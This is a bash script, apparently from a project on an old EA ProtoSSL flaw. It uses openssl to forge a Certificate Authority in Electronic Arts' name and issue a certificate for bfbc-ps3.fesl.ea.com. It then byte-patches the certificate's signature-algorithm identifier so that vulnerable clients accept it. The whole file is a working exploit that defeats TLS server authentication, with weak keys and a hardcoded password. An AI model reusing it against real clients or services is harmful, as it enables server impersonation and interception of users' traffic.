#!/bin/bash
# Original script from: https://github.com/Aim4kill/Bug_OldProtoSSL

CA_NAME="OTG3"

cdir=$(mktemp --directory)
C_NAME="md5_ea_cert"
MOD_NAME="fesl_vuln"

echo "Creating certificate, temporary directory: $cdir"

# Create private key for the Certificate Authority
openssl genrsa -aes128 -out $cdir/$CA_NAME.key.pem -passout pass:123456 1024
openssl rsa -in $cdir/$CA_NAME.key.pem -out $cdir/$CA_NAME.key.pem -passin pass:123456

# Create the certificate of the Certificate Authority
openssl req -new -md5 -x509 -days 28124 -key $cdir/$CA_NAME.key.pem -out $cdir/$CA_NAME.crt -subj "/OU=Online Technology Group/O=Electronic Arts, Inc./L=Redwood City/ST=California/C=US/CN=OTG3 Certificate Authority"

# ------------Certificate Authority created, now we can create Certificate------------

# Create private key for the Certificate
openssl genrsa -aes128 -out $cdir/$C_NAME.key.pem -passout pass:123456 1024
openssl rsa -in $cdir/$C_NAME.key.pem -out $cdir/$C_NAME.key.pem -passin pass:123456

# Create certificate signing request of the certificate
openssl req -new -key $cdir/$C_NAME.key.pem -out $cdir/$C_NAME.csr -subj "/CN=bfbc-ps3.fesl.ea.com/OU=Global Online Studio/O=Electronic Arts, Inc./ST=California/C=US"

# Create the certificate
openssl x509 -req -in $cdir/$C_NAME.csr -CA $cdir/$CA_NAME.crt -CAkey $cdir/$CA_NAME.key.pem -CAcreateserial -out $cdir/$C_NAME.crt -days 10000 -sha1

# ------------Certificate created, now export it to .der format so we can modify it------------
openssl x509 -outform der -in $cdir/$C_NAME.crt -out $cdir/$C_NAME.der

echo "Patching certificate..."
xxd -p "$cdir/$C_NAME.der" | sed '0,/2a864886f70d010105/s//2a864886f70d010101/g' | xxd -r -p > "$cdir/$MOD_NAME.der"

# ------------Certificate modified, now export it to .pfx format so we can use it------------

# Convert .der back to .crt
openssl x509 -inform der -in $cdir/$MOD_NAME.der -out $cdir/$MOD_NAME.crt

# Export it as .pfx file (you will have to type .pfx password)
openssl pkcs12 -export -out $cdir/$MOD_NAME.pfx -inkey $cdir/$C_NAME.key.pem -in $cdir/$MOD_NAME.crt -passout pass:123456

mv $cdir/$MOD_NAME.pfx ./$MOD_NAME.pfx
mv $cdir/$MOD_NAME.crt ./$MOD_NAME.crt